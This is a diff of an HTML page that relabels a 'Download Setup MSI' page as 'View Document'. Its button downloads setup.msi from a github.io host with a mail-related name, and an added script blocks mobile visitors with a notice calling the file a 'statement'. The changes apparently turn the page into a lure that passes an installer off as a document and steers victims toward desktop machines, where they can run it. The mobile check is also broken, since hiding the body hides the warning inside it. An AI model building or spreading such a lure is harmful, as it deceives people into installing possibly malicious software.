@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Setup MSI</title>
+    <title>View Document</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 50px;
             background-color: #f4f4f4;
+            margin: 0;
         }
         h1 {
             color: #333;
@@ -33,13 +34,45 @@
         button:hover {
             background-color: #0056b3;
         }
+        .warning {
+            color: red;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+        @media (max-width: 768px) {
+            body {
+                display: none;
+            }
+            .warning {
+                display: block;
+                text-align: center;
+                margin-top: 50px;
+            }
+        }
     </style>
 </head>
 <body>
-    <h1>Download Setup MSI</h1>
+    <h1>View Document</h1>
     <p>Click the button below to download the setup MSI file.</p>
     <a href="https://mailaol254.github.io/mailauth/setup.msi" download>
         <button>View Document</button>
     </a>
+    <div class="warning" id="mobileWarning" style="display: none;">
+        Access denied. This statement file is only available for download on a laptop or desktop computer. To continue, please use a laptop or desktop computer.
+    </div>
+    <script>
+        function checkDevice() {
+            if (window.innerWidth <= 768) {
+                document.body.style.display = 'none';
+                document.getElementById('mobileWarning').style.display = 'block';
+            } else {
+                document.body.style.display = 'block';
+                document.getElementById('mobileWarning').style.display = 'none';
+            }
+        }
+
+        window.onload = checkDevice;
+        window.onresize = checkDevice;
+    </script>
 </body>
 </html>
